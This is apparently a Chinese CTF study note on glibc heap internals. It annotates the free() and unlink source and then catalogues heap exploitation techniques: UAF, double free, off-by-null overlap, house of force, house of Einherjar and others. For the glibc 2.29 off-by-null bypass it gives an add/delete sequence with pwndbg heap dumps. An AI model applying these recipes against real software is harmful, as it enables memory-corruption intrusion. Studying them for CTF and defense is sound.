/*  Consolidate other non-mmapped chunks as they arrive.*/else if (!chunk_is_mmapped(p))&#123;  //当前还没有获得分配区的锁，获取分配区的锁。  if (!have_lock)  &#123;    (void)mutex_lock(&amp;av-&gt;mutex);    locked = 1;  &#125;  //获取当前 free 的 chunk 的下一个相邻的 chunk。  nextchunk = chunk_at_offset(p, size);      //进行安全检查，当前 free 的 chunk 不能为 top chunk，因为 top chunk 为空闲 chunk，如果再次 free 就可能为 double free 错误了。  /* Lightweight tests: check whether the block is already the     top block.  */  if (__glibc_unlikely(p == av-&gt;top))  &#123;    errstr = &quot;double free or corruption (top)&quot;;    goto errout;  &#125;  //如果当前 free 的 chunk 是通过 sbrk() 分配的，并且下一个相邻的 chunk 的地址已经超过了 top chunk 的结束地址，即超过了当前分配区的结束地址，报错。  /* Or whether the next chunk is beyond the boundaries of the arena.  */  if (__builtin_expect(contiguous(av) &amp;&amp; (char *)nextchunk &gt;= ((char *)av-&gt;top + chunksize(av-&gt;top)), 0))  &#123;    errstr = &quot;double free or corruption (out)&quot;;    goto errout;  &#125;    //如果当前 free 的 chunk 的下一个相邻 chunk 的 size 中标志位没有标识当前 free chunk 为 inuse 状态，可能为 double free 错误。  //这就是为什么 fast bin 的 double free 这么容易利用，因为 chunk 被链入 fast bin 是不会将下一个 chunk 的 pre_inuse 位置 0 的。  /* Or whether the block is actually not marked used.  */  if (__glibc_unlikely(!prev_inuse(nextchunk)))  &#123;    errstr = &quot;double free or corruption (!prev)&quot;;    goto errout;  &#125;  //计算当前 free 的 chunk 的下一个相邻 chunk 的大小，该大小如果小于等于 2*SIZE_SZ 或是大于了分配区所分配区的内存总量，报错。  nextsize = chunksize(nextchunk);  if (__builtin_expect(nextchunk-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect(nextsize &gt;= av-&gt;system_mem, 0))  &#123;    errstr = &quot;free(): invalid next size (normal)&quot;;    goto errout;  &#125;  free_perturb(chunk2mem(p), size - 2 * SIZE_SZ);
   /* consolidate backward *///如果当前 free 的 chunk 的前一个相邻 chunk 为空闲状态，与前一个空闲 chunk 合并。计算合并后的 chunk 大小，并将前一个相邻空闲 chunk 从空闲 chunk 链表中删除。   if (!prev_inuse(p))   &#123;     prevsize = p-&gt;prev_size;     size += prevsize;     p = chunk_at_offset(p, -((long)prevsize));     unlink(av, p, bck, fwd);   &#125;//如果与当前 free 的 chunk 相邻的下一个 chunk 不是分配区的 top chunk，查看与当前 chunk 相邻的下一个 chunk 是否处于 inuse 状态。如果与当前 free 的 chunk 相邻的下一个 chunk 处于 inuse 状态，清除当前 chunk 的 inuse 状态，则当前 chunk 空闲了。//否则，将相邻的下一个空闲 chunk 从空闲链表中删除，并计算当前 chunk 与下一个 chunk 合并后的 chunk 大小。   if (nextchunk != av-&gt;top)   &#123;     /* get and clear inuse bit */     nextinuse = inuse_bit_at_offset(nextchunk, nextsize);     /* consolidate forward */     if (!nextinuse)     &#123;       unlink(av, nextchunk, bck, fwd);       size += nextsize;     &#125;     else       clear_inuse_bit_at_offset(nextchunk, 0);     /* Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc.     */     //将合并后的 chunk 加入 unsorted bin 的双向循环链表中。如果合并后的 chunk 属于 large  bins，将 chunk 的 fd_nextsize 和 bk_nextsize 设置为 NULL，因为在 unsorted bin 中这两个字段无用。     bck = unsorted_chunks(av);     fwd = bck-&gt;fd;     if (__glibc_unlikely(fwd-&gt;bk != bck))     &#123;       errstr = &quot;free(): corrupted unsorted chunks&quot;;       goto errout;     &#125;     p-&gt;fd = fwd;     p-&gt;bk = bck;     if (!in_smallbin_range(size))     &#123;       p-&gt;fd_nextsize = NULL;       p-&gt;bk_nextsize = NULL;     &#125;     bck-&gt;fd = p;     fwd-&gt;bk = p;     //设置合并后的空闲 chunk 大小，并标识前一个 chunk 处于 inuse 状态，因为必须保证不能有两个相邻的 chunk 都处于空闲状态。然后将合并后的 chunk 加入 unsorted bin 的双向循环链表中。最后设置合并后的空闲 chunk 的 foot，chunk 空闲时必须设置 foot，该 foot 处于下一个 chunk 的 prev_size 中，只有 chunk 空闲是 foot 才是有效的。     set_head(p, size | PREV_INUSE);     set_foot(p, size);     check_free_chunk(av, p);   &#125;   /*     If the chunk borders the current high end of memory,     consolidate into top   *///如果当前 free 的 chunk 下一个相邻的 chunk 为 top chunk，则将当前 chunk 合并入 top chunk，修改 top chunk 的大小。   else   &#123;     size += nextsize;     set_head(p, size | PREV_INUSE);     av-&gt;top = p;     check_chunk(av, p);   &#125;
    /*      If freeing a large space, consolidate possibly-surrounding      chunks. Then, if the total unused topmost memory exceeds trim      threshold, ask malloc_trim to reduce top.      Unless max_fast is 0, we don&#x27;t know if there are fastbins      bordering top, so we cannot tell for sure whether threshold      has been reached unless fastbins are consolidated.  But we      don&#x27;t want to consolidate on each free.  As a compromise,      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD      is reached.    */	//如果合并后的 chunk 大小大于 64KB(0x10000)，并且 fast bins 中存在空闲 chunk，调用 malloc_consolidate() 函数合并 fast bins 中的空闲 chunk 到 unsorted bin 中。	//这里也很重要，就是判断得到的 unsorted bin size 是否大于 FASTBIN_CONSOLIDATION_THRESHOLD，就会触发 malloc_consolidate。    if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD)    &#123;      if (have_fastchunks(av))        malloc_consolidate(av);      //如果当前分配区为主分配区，并且 top chunk 的大小大于 heap 的收缩阈值，调用 systrim() 函数收缩 heap。      if (av == &amp;main_arena)      &#123;#ifndef MORECORE_CANNOT_TRIM        if ((unsigned long)(chunksize(av-&gt;top)) &gt;=            (unsigned long)(mp_.trim_threshold))          systrim(mp_.top_pad, av);#endif      &#125;      //如果为非主分配区，调用 heap_trim()函数收缩非主分配区的 sub_heap。      else      &#123;        /* Always try heap_trim(), even if the top chunk is not           large, because the corresponding heap might go away.  */        heap_info *heap = heap_for_ptr(top(av));        assert(heap-&gt;ar_ptr == av);        heap_trim(heap, mp_.top_pad);      &#125;    &#125;	//如果获得了分配区的锁，则对分配区解锁。    if (!have_lock)    &#123;      assert(locked);      (void)mutex_unlock(&amp;av-&gt;mutex);    &#125;  &#125;
  /*    If the chunk was allocated via mmap, release via munmap().  *///如果当前 free 的 chunk 是通过 mmap()分配的，调用 munma_chunk()释放内存。  else  &#123;    munmap_chunk(p);  &#125;&#125;
unlink
/* Take a chunk off a bin list */ // unlink p define unlink(AV, P, BK, FD) &#123; \ 	// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。 	if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \ 	malloc_printerr (&quot;corrupted size vs. prev_size&quot;); \ 	FD = P-&gt;fd; \ 	BK = P-&gt;bk; \ 	// 防止攻击者简单篡改空闲的 chunk 的 fd 与 bk 来实现任意写的效果。 	if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \ 		malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV); \ 	else &#123; \ 		FD-&gt;bk = BK; \ 		BK-&gt;fd = FD; \ 		// 下面主要考虑 P 对应的 nextsize 双向链表的修改 		if (!in_smallbin_range (chunksize_nomask (P)) \ 			// 如果P-&gt;fd_nextsize为 NULL，表明 P 未插入到 nextsize 链表中。 			// 那么其实也就没有必要对 nextsize 字段进行修改了。 			// 这里没有去判断 bk_nextsize 字段，可能会出问题。 			&amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123; \ 			// 类似于小的 chunk 的检查思路 			if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) \ 				|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) \ 				malloc_printerr (check_action, \ 					&quot;corrupted double-linked list (not small)&quot;, \ 					P, AV); \ 			// 这里说明 P 已经在 nextsize 链表中了。 			// 如果 FD 没有在 nextsize 链表中 			if (FD-&gt;fd_nextsize == NULL) &#123; \ 				// 如果 nextsize 串起来的双链表只有 P 本身，那就直接拿走 P 				// 令 FD 为 nextsize 串起来的 				if (P-&gt;fd_nextsize == P) \ 					FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; \ 				else &#123; \ 				// 否则我们需要将 FD 插入到 nextsize 形成的双链表中 					FD-&gt;fd_nextsize = P-&gt;fd_nextsize; \ 					FD-&gt;bk_nextsize = P-&gt;bk_nextsize; \ 					P-&gt;fd_nextsize-&gt;bk_nextsize = FD; \ 					P-&gt;bk_nextsize-&gt;fd_nextsize = FD; \ 					&#125; \ 				&#125; else &#123; \ 				// 如果在的话，直接拿走即可 				P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; \ 				P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; \ 				&#125; \ 			&#125; \ 	&#125; \ &#125;
attack
UAF

漏洞：free(*ptr)后没有ptr=NULL free(chunk)edit(chunk-&gt;fd = target_addr)target[0] = 0target[1] = fake_sizemalloc(chunk)malloc(target)

double free

漏洞：UAF
可利用：fastbin、tcache #这里free(chunk1)是指释放chunk1,只是为了方便表达free(chunk1)free(chunk2)free(chunk1)malloc(chunk1)edit(chunk1-&gt;fd = target_addr)malloc(chunk2)malloc(chunk1)malloc(chunk3)(malloc(target),这样就实现了任意地址写) 

unlink

漏洞：off by ... 、堆溢出
**可利用：unsortedbin malloc(chunk1)malloc(chunk2)edit(chunk1-&gt;fd = 0)edit(chunk1-&gt;bk = chunk_size-0x10)edit(chunk1-&gt;bk+0x8 = chunk1_ptr_addr-0x18)edit(chunk1-&gt;bk+0x10 = chunk1_ptr_addr-0x10)edit(chunk2-&gt;prev_size = chunk_size-0x11)edit(chunk2-&gt;size = chunk_size-0x1)free(chunk2)#pre_chunk1-&gt;bk+0x8 = chunk1-&gt;bk+0x10 = main_arena+...#chunk1-&gt;chunk1_ptr_addr-0x18edit(chunk1_ptr_addr = got) #leak libc...

Off by …
heap overlap
#chunk1,chunk2,chunk3 all allocated#chunk1 | chunk2 | chunk3#off by one -&gt; chunk1edit(chunk2-&gt;size = chunk2_size+chunk3_size+1)free(chunk2)malloc(chunk2+chunk3)#任意写chunk3
#chunk2 free ; chunk3 allocated#chunk1 | chunk2 | chunk3#off by one -&gt; chunk1edit(chunk2-&gt;size = chunk2_size+chunk3_size+1)free(chunk2)malloc(chunk2+chunk3)#任意写chunk3
#chunk1,chunk2,chunk3 all allocated#chunk1 | chunk2 | chunk3#chunk3-&gt;size%0x100 = 0free(chunk1)#off by null -&gt; chunk2 ; chunk3-&gt;prev_inuse = 0edit(chunk3-&gt;prev_size = chunk1_size+chunk2_size)free(chunk3)malloc(chunk1+chunk2+chunk3)#任意写chunk2
#chunk0,chunk1,chunk2,chunk3 all allocated#chunk0 | chunk1 | chunk2 | chunk3free(chunk0)  #在 chunk1 的 prev_size 域留下 chunk0 的大小#off by null -&gt; chunk1 ; chunk2-&gt;prev_inuse = 0edit(chunk2-&gt;prev_size = chunk0_size+chunk1_size)...

现在有 Chunk_0、Chunk_1、Chunk_2、Chunk_3。
释放 Chunk_0 ，此时将会在 Chunk_1 的 prev_size 域留下 Chunk_0 的大小
在 Chunk_1 处触发Off-by-null，篡改 Chunk_2 的 prev_size 域以及 prev_inuse位
Glibc 通过 Chunk_2 的 prev_size 域找到空闲的 Chunk_0
将 Chunk_0 进行 Unlink 操作，通过 Chunk_0 的 size 域找到 nextchunk 就是 Chunk_1 ，检查 Chunk_0 的 size 与 Chunk_1 的 prev_size 是否相等。
由于第二步中已经在 Chunk_1 的 prev_size 域留下了 Chunk_0 的大小，因此，检查通过。

2.29
新增的保护 if (chunksize (p) != prev_size (next_chunk (p)))        malloc_printerr (&quot;corrupted size vs. prev_size&quot;);
新的构造绕过 add(0,0x418,b&#x27;a&#x27;)add(1,0x108,b&#x27;a&#x27;)add(2,0x438,b&#x27;a&#x27;)add(3,0x438,b&#x27;a&#x27;)add(4,0x108,b&#x27;a&#x27;)add(5,0x488,b&#x27;a&#x27;)add(6,0x428,b&#x27;a&#x27;)add(7,0x108,b&#x27;a&#x27;)delete(0)delete(3)delete(6)delete(2)add(2,0x458,b&#x27;\x00&#x27;*0x438+b&#x27;\x51\x05&#x27;)add(3,0x418,b&#x27;a&#x27;)add(0,0x418,b&#x27;0&#x27;*0x100)add(6,0x428,b&#x27;a&#x27;)delete(0)delete(3)add(0,0x418,b&#x27;\x00&#x27;*8)delete(6)delete(5)add(5,0x4f8,b&#x27;\x00&#x27;*0x488+p64(0x431))add(6,0x3b8,b&#x27;a&#x27;)add(3,0x418,b&#x27;a&#x27;)delete(4)add(4,0x108,b&#x27;\x00&#x27;*0x100+p64(0x550))delete(5)
下面演示一下，执行到delete(6) pwndbg&gt; parseheapaddr                prev                size                 status              fd                bk0x61107b3f7000      0x0                 0x290                Used                None              None0x61107b3f7290      0x0                 0x420                Freed     0x73ccc601ace0    0x61107b3f7c000x61107b3f76b0      0x420               0x110                Used                None              None0x61107b3f77c0      0x0                 0x440                Used                None              None0x61107b3f7c00      0x0                 0x440                Freed     0x61107b3f7290    0x61107b3f85e00x61107b3f8040      0x440               0x110                Used                None              None0x61107b3f8150      0x0                 0x490                Used                None              None0x61107b3f85e0      0x0                 0x430                Freed     0x61107b3f7c00    0x73ccc601ace00x61107b3f8a10      0x430               0x110                Used                None              None delete(2)造成合并
pwndbg&gt; parseheapaddr                prev                size                 status              fd                bk0x61107b3f7000      0x0                 0x290                Used                None              None0x61107b3f7290      0x0                 0x420                Freed     0x73ccc601ace0    0x61107b3f85e00x61107b3f76b0      0x420               0x110                Used                None              None0x61107b3f77c0      0x0                 0x880                Freed     0x61107b3f85e0    0x73ccc601ace00x61107b3f8040      0x880               0x110                Used                None              None0x61107b3f8150      0x0                 0x490                Used                None              None0x61107b3f85e0      0x0                 0x430                Freed     0x61107b3f7290    0x61107b3f77c00x61107b3f8a10      0x430               0x110                Used                None              None
将原来的2号扩展0x20，将原来三号的头保护起来，成为新的2号，而原来的3号缩小了0x20
pwndbg&gt; parseheapaddr                prev                size                 status              fd                bk0x61107b3f7000      0x0                 0x290                Used                None              None0x61107b3f7290      0x0                 0x420                Freed     0x73ccc601b0d0    0x61107b3f85e00x61107b3f76b0      0x420               0x110                Used                None              None0x61107b3f77c0      0x0                 0x460                Used                None              None0x61107b3f7c20      0x0                 0x420                Freed     0x73ccc601ace0    0x73ccc601ace00x61107b3f8040      0x420               0x110                Used                None              None0x61107b3f8150      0x0                 0x490                Used                None              None0x61107b3f85e0      0x0                 0x430                Freed     0x61107b3f7290    0x73ccc601b0d00x61107b3f8a10      0x430               0x110                Used                None              None
保护的fd、bk指向0号和6号，另外把chunk的大小改为chunk3_size+chunk4_size
pwndbg&gt; tele 0x61107b3f7c0000:0000│     0x61107b3f7c00 ◂— 001:0008│     0x61107b3f7c08 ◂— 0x55102:0010│     0x61107b3f7c10 —▸ 0x61107b3f7290 ◂— 003:0018│     0x61107b3f7c18 —▸ 0x61107b3f85e0 ◂— 004:0020│     0x61107b3f7c20 ◂— 005:0028│     0x61107b3f7c28 ◂— 0x42106:0030│     0x61107b3f7c30 —▸ 0x73ccc601ace0 (main_arena+96) —▸ 0x61107b3f8b20 ◂— 007:0038│     0x61107b3f7c38 —▸ 0x73ccc601ace0 (main_arena+96) —▸ 0x61107b3f8b20 ◂— 0
接着可以把其他的堆块全申请回来，这里原来的3号prev_size地址一定是以\x00结尾，这样我们就可以利用off-by-null让他从指向新的3号到指向旧的3号
pwndbg&gt; parseheapaddr                prev                size                 status              fd                bk0x61107b3f7000      0x0                 0x290                Used                None              None0x61107b3f7290      0x0                 0x420                Used                None              None0x61107b3f76b0      0x420               0x110                Used                None              None0x61107b3f77c0      0x0                 0x460                Used                None              None0x61107b3f7c20      0x0                 0x420                Used                None              None0x61107b3f8040      0x420               0x110                Used                None              None0x61107b3f8150      0x0                 0x490                Used                None              None0x61107b3f85e0      0x0                 0x430                Used                None              None0x61107b3f8a10      0x430               0x110                Used                None              None
接着我们构造0号bk指针指向原来的3号地址
pwndbg&gt; parseheapaddr                prev                size                 status              fd                bk0x61107b3f7000      0x0                 0x290                Used                None              None0x61107b3f7290      0x0                 0x420                Freed     0x73ccc601ace0    0x61107b3f7c200x61107b3f76b0      0x420               0x110                Used                None              None0x61107b3f77c0      0x0                 0x460                Used                None              None0x61107b3f7c20      0x0                 0x420                Freed     0x61107b3f7290    0x73ccc601ace00x61107b3f8040      0x420               0x110                Used                None              None0x61107b3f8150      0x0                 0x490                Used                None              None0x61107b3f85e0      0x0                 0x430                Used                None              None0x61107b3f8a10      0x430               0x110                Used                None              None
off-by-null前
pwndbg&gt; tele 0x61107b3f729000:0000│     0x61107b3f7290 ◂— 001:0008│     0x61107b3f7298 ◂— 0x42102:0010│     0x61107b3f72a0 —▸ 0x73ccc601ace0 (main_arena+96) —▸ 0x61107b3f8b20 ◂— 003:0018│     0x61107b3f72a8 —▸ 0x61107b3f7c20 ◂— 004:0020│     0x61107b3f72b0 ◂— 005:0028│     0x61107b3f72b8 ◂— 0
off-by-null后
00:0000│     0x61107b3f7290 ◂— 001:0008│     0x61107b3f7298 ◂— 0x42102:0010│  r9 0x61107b3f72a0 ◂— 003:0018│     0x61107b3f72a8 —▸ 0x61107b3f7c00 ◂— 004:0020│     0x61107b3f72b0 ◂— 005:0028│     0x61107b3f72b8 ◂— 0
bk指向了原来的3号
pwndbg&gt; tele 0x61107b3f7c0000:0000│     0x61107b3f7c00 ◂— 001:0008│     0x61107b3f7c08 ◂— 0x55102:0010│     0x61107b3f7c10 —▸ 0x61107b3f7290 ◂— 003:0018│     0x61107b3f7c18 —▸ 0x61107b3f85e0 ◂— 004:0020│     0x61107b3f7c20 ◂— 005:0028│     0x61107b3f7c28 ◂— 0x42106:0030│     0x61107b3f7c30 —▸ 0x73ccc601ace0 (main_arena+96) —▸ 0x61107b3f8b20 ◂— 007:0038│     0x61107b3f7c38 —▸ 0x73ccc601ace0 (main_arena+96) —▸ 0x61107b3f8b20 ◂— 0
接着修改6号的fd指向原来的3号
先free掉块合并
pwndbg&gt; parseheapaddr                prev                size                 status              fd                bk0x61107b3f7000      0x0                 0x290                Used                None              None0x61107b3f7290      0x0                 0x420                Used                None              None0x61107b3f76b0      0x420               0x110                Used                None              None0x61107b3f77c0      0x0                 0x460                Used                None              None0x61107b3f7c20      0x0                 0x420                Freed     0x73ccc601ace0    0x61107b3f81500x61107b3f8040      0x420               0x110                Used                None              None0x61107b3f8150      0x0                 0x8c0                Freed     0x61107b3f7c20    0x73ccc601ace00x61107b3f8a10      0x8c0               0x110                Used                None              None
off-by-null前
pwndbg&gt; tele 0x61107b3f8150+0x49000:0000│     0x61107b3f85e0 ◂— 001:0008│     0x61107b3f85e8 ◂— 0x43102:0010│     0x61107b3f85f0 —▸ 0x61107b3f7c20 ◂— 003:0018│     0x61107b3f85f8 —▸ 0x73ccc601ace0 (main_arena+96) —▸ 0x61107b3f8b20 ◂— 004:0020│     0x61107b3f8600 ◂— 0... ↓     3 skipped
off-by-null后 pwndbg&gt; tele 0x61107b3f8150+0x49000:0000│     0x61107b3f85e0 ◂— 001:0008│     0x61107b3f85e8 ◂— 0x43102:0010│     0x61107b3f85f0 —▸ 0x61107b3f7c00 ◂— 003:0018│     0x61107b3f85f8 —▸ 0x73ccc601ace0 (main_arena+96) —▸ 0x61107b3f8b20 ◂— 004:0020│     0x61107b3f8600 ◂— 0... ↓     3 skipped
pwndbg&gt; parseheapaddr                prev                size                 status              fd                bk0x61107b3f7000      0x0                 0x290                Used                None              None0x61107b3f7290      0x0                 0x420                Used                None              None0x61107b3f76b0      0x420               0x110                Used                None              None0x61107b3f77c0      0x0                 0x460                Used                None              None0x61107b3f7c20      0x0                 0x420                Freed     0x73ccc601b0d0    0x73ccc601b0d00x61107b3f8040      0x420               0x110                Used                None              None0x61107b3f8150      0x0                 0x500                Used                None              None0x61107b3f8650      0x0                 0x3c0                Freed     0x73ccc601ace0    0x73ccc601ace00x61107b3f8a10      0x3c0               0x110                Used                None              None
fd成功指向旧的3号，这样我们就已经构造完了
pwndbg&gt; x/6gx 0x61107b3f72900x61107b3f7290: 0x0000000000000000      0x00000000000004210x61107b3f72a0: 0x0000000000000000      0x000061107b3f7c000x61107b3f72b0: 0x0000000000000000      0x0000000000000000pwndbg&gt; x/6gx 0x61107b3f7c000x61107b3f7c00: 0x0000000000000000      0x00000000000005510x61107b3f7c10: 0x000061107b3f7290      0x000061107b3f85e00x61107b3f7c20: 0x0000000000000000      0x0000000000000421pwndbg&gt; x/6gx 0x61107b3f85e00x61107b3f85e0: 0x0000000000000000      0x00000000000004310x61107b3f85f0: 0x000061107b3f7c00      0x000073ccc601ace00x61107b3f8600: 0x0000000000000000      0x0000000000000000
接着让4可以实现UAF，off-by-null修改5号的prev_inuse，并且使prev_size改为3号和4号的大小和，再free掉5，这样旧的3号、4号、5号就会合并成一个大free块，但是4号还可以使用
off-by-null前
pwndbg&gt; parseheapaddr                prev                size                 status              fd                bk0x61107b3f7000      0x0                 0x290                Used                None              None0x61107b3f7290      0x0                 0x420                Used                None              None0x61107b3f76b0      0x420               0x110                Used                None              None0x61107b3f77c0      0x0                 0x460                Used                None              None0x61107b3f7c20      0x0                 0x420                Used                None              None0x61107b3f8040      0x420               0x110                Used                None              None0x61107b3f8150      0x0                 0x500                Used                None              None0x61107b3f8650      0x0                 0x3c0                Used                None              None0x61107b3f8a10      0x3c0               0x110                Used                None              None
off-by-null后
pwndbg&gt; tele 0x61107b3f815000:0000│     0x61107b3f8150 ◂— 0x55001:0008│     0x61107b3f8158 ◂— 0x50002:0010│     0x61107b3f8160 ◂— 0... ↓     5 skipped
堆状态
pwndbg&gt; parseheapaddr                prev                size                 status              fd                bk0x61107b3f7000      0x0                 0x290                Used                None              None0x61107b3f7290      0x0                 0x420                Used                None              None0x61107b3f76b0      0x420               0x110                Used                None              None0x61107b3f77c0      0x0                 0x460                Used                None              None0x61107b3f7c20      0x0                 0x420                Used                None              None0x61107b3f8040      0x420               0x110                Freed                0x0               0x00x61107b3f8150      0x550               0x500                Used                None              None0x61107b3f8650      0x0                 0x3c0                Used                None              None0x61107b3f8a10      0x3c0               0x110                Used                None              None
最后一步，把5号delete，由于prev_inuse为0，所以找prev_size定位到原来的3号头，通过fd、bk指针找到0号和6号，而0号的bk指向原来的3号，6号的fd指向原来的3号，而新增的检查
pwndbg&gt; tele 0x61107b3f7c0000:0000│     0x61107b3f7c00 ◂— 001:0008│     0x61107b3f7c08 ◂— 0x55102:0010│     0x61107b3f7c10 —▸ 0x61107b3f7290 ◂— 003:0018│     0x61107b3f7c18 —▸ 0x61107b3f85e0 ◂— 004:0020│     0x61107b3f7c20 ◂— 005:0028│     0x61107b3f7c28 ◂— 0x42106:0030│     0x61107b3f7c30 —▸ 0x73ccc6010061 ◂— 0xd00e4201c80ef00207:0038│     0x61107b3f7c38 —▸ 0x73ccc601b0d0 (main_arena+1104) —▸ 0x73ccc601b0c0 (main_arena+1088) —▸ 0x73ccc601b0b0 (main_arena+1072) —▸ 0x73ccc601b0a0 (main_arena+1056) ◂— ...pwndbg&gt; tele 0x61107b3f7c00+0x55000:0000│     0x61107b3f8150 ◂— 0x55001:0008│     0x61107b3f8158 ◂— 0x50002:0010│     0x61107b3f8160 ◂— 0
满足，于是delete5号合并
pwndbg&gt; parseheapaddr                prev                size                 status              fd                bk0x61107b3f7000      0x0                 0x290                Used                None              None0x61107b3f7290      0x0                 0x420                Used                None              None0x61107b3f76b0      0x420               0x110                Used                None              None0x61107b3f77c0      0x0                 0x460                Freed                0x0               0x0Corrupt ?! (size == 0) (0x61107b3f7c20)pwndbg&gt; tele 0x61107b3f7c0000:0000│     0x61107b3f7c00 ◂— 001:0008│     0x61107b3f7c08 ◂— 0xa51 /* &#x27;Q\n&#x27; */02:0010│     0x61107b3f7c10 —▸ 0x73ccc601ace0 (main_arena+96) —▸ 0x61107b3f8b20 ◂— 003:0018│     0x61107b3f7c18 —▸ 0x73ccc601ace0 (main_arena+96) —▸ 0x61107b3f8b20 ◂— 004:0020│     0x61107b3f7c20 ◂— 005:0028│     0x61107b3f7c28 ◂— 006:0030│     0x61107b3f7c30 —▸ 0x73ccc6010061 ◂— 0xd00e4201c80ef00207:0038│     0x61107b3f7c38 —▸ 0x73ccc601b0d0 (main_arena+1104) —▸ 0x73ccc601b0c0 (main_arena+1088) —▸ 0x73ccc601b0b0 (main_arena+1072) —▸ 0x73ccc601b0a0 (main_arena+1056) ◂— ...pwndbg&gt; binstcachebinsemptyfastbinsemptyunsortedbinall: 0x61107b3f7c00 —▸ 0x73ccc601ace0 (main_arena+96) ◂— 0x61107b3f7c00smallbinsemptylargebinsempty
unsortedbin attack
decrypt_safe_linking
以free函数为例子，在2.32glibc中在释放chunk时不是直接把fd值放入p-&gt;fd中。而是经过PROTECT_PTR或REVEAL_PTR处理。PROTECT_PTR和 REVEAL_PTR在宏定义中定义： /* Safe-Linking:     Use randomness from ASLR (mmap_base) to protect single-linked lists     of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the     lists&#x27; chunks, and also perform allocation alignment checks on them.     This mechanism reduces the risk of pointer hijacking, as was done with     Safe-Unlinking in the double-linked lists of Small-Bins.     It assumes a minimum page size of 4096 bytes (12 bits).  Systems with     larger pages provide less entropy, although the pointer mangling     still works.  */  #define PROTECT_PTR(pos, ptr) \    ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))  #define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)
tcache stashing unlink attack

效果：类似unsortedbin attack在任意地址写入一个libc地址，任意地址分配
版本：带tcache的版本
原理：如果我们需要的chunk位于了smallbin里面，当我们将chunk从smallbin拿出来的时候，还会去检查当前smallbin链上是否还有剩余堆块，如果有的话并且tcachebin的链上还有空余位置并且tcache bin不能为空，就会将剩余的那个堆块给链入到tcachebin中。而将small bin中的堆块链入到tcache bin中的时候没有进行双向链表完整性的检查，此时攻击那个即将链入tcachebin的堆块的bk指针，即可向任意地址写入一个libc地址
前提：

用calloc分配堆块
可以控制smallbin中的bk指针
smallbin中最少要有两个堆块

攻击步骤(方式1)

先进行堆地址的泄露
然后将tcachebin中只留6个堆块，这样smallbin链入tcachebin后，tcachebin就会直接装满，防止程序继续通过我们篡改的bk指针继续往下遍历
再做出至少两个位于smallbin中的chunk（可以通过切割unsorted bin的方式，让剩余部分的堆块进入small bin或者当遍历unsorted bin的时候，会给堆块分类，让其小堆块进入small bin中）
利用溢出或UAF+edit等手段，篡改位于smallbin中的链表头堆块的bk指针为target_addr-0x10
注意伪造bk的时候一定不能破坏fd指针
最后我们申请一个位于smallbin那条链对应size中的chunk，将smallbin中的链表尾堆块申请出来，而smallbin链中的链表头堆块则进入tcachebin，在链入tcachebin的期间触发了tcache stashing unlink attack

攻击步骤(方式2)

先进行堆地址的泄露
然后将tcachebin中只留5个堆块
再做出至少两个位于smallbin中的chunk
利用溢出或UAF+edit等手段，篡改位于smallbin中的链表头堆块的bk指针为我们想要申请的地址附近fake_chunk_addr-0x10，再修改fake_chunk_bk=target_addr-0x10
注意伪造bk的时候一定不能破坏fd指针
最后我们申请一个位于smallbin那条链对应size中的chunk，在链入tcachebin的期间触发了tcache stashing unlink attack，得到了一个堆块的分配和一个任意地址写libc


largebin attack
tcache poisoning
修改放入tcachebin的attack chunk的fd指针指向想要控制的地址，申请与attack chunk大小相同的chunk即可申请到想要的地址 高版本使用了异或加密，所以我们写入的也要加密
house of spirit

版本：2.23~
目的：获得某块内存的任意写
利用方式：在某块内存伪造chunk，将本来不是chunk的这块内存被free到bins里，再次malloc后就实现了任意写
伪造结构：

fake_chunk

prev_size无要求
size

N-&gt;0
M-&gt;0
P-&gt;0
prev_size的最低位地址满足16字节对齐（64位）
size&lt;0x80
size满足16字节对齐（64位）

fd、bk、data无要求

next_chunk

prev_size无要求
size&lt;128KB
size满足16字节对齐（64位）


利用前提

能通过溢出控制要free的地址

注意事项

注意题目中的计数器
如果有多个地方可以伪造，注意伪造到哪个地方对后续有用。
注意伪造堆块的size位和next_size位。
还要注意程序逻辑，如果当程序释放完fake_chunk后还要再继续释放，可能就会出现问题，这时就要在fake_chunk中写入适当的数据，绕过程序逻辑


house of Einherjar

版本：2.23~
目的：获得某块内存的任意写
利用方式：在某块内存伪造chunk，利用off-by-one使堆块后向合并，将指针更新为指向fake chunk，再次malloc后就实现了在fake chunk任意写
伪造结构：

fake_chunk

prev_size = chunk1_size
size

N-&gt;0
M-&gt;0
P-&gt;0
prev_size的最低位地址满足16字节对齐（64位）
size = chunk1_size

fd、bk、fd_nextsize、bk_nextsize = fake_chunk_prev_size_addr

chunk0
chunk1

prev_size = chunk1_addr-fake_chunk_addr
N-&gt;0
M-&gt;0
P-&gt;0
size是0x100整数倍（size=0也被允许）


利用前提

off-by-one、off-by-null
能获得堆地址和fake chunk地址


house of force

版本：2.23~2.29
目的：获得某块内存的任意写
利用方式：修改top chunk的size极大，申请一个可能极大的堆（从堆地址一直到要修改的地址），将top chunk指针更新为指向target，再次malloc后就实现了在target任意写
攻击方式：

通过溢出修改top chunk的size位为-1
申请一个特定大小的堆(可以是负数)

req=dest - old_top_prev_size_addr - 4*sizeof(long)

再次申请即可实现某块特定内存的任意写

利用前提

堆溢出修改top chunk的size
能获得堆地址和目的地址


house of lore

版本：2.23~2.31
目的：获得某块内存的任意写
利用方式：在某块内存伪造chunk和辅助chunk，利用UAF修改smallbin的bk指针，使fake_chunk链入smallbin，malloc smallbin后再次malloc后就实现了在fake chunk任意写
伪造结构：

fake_chunk_1

fd = small_chunk_1_prev_size_addr
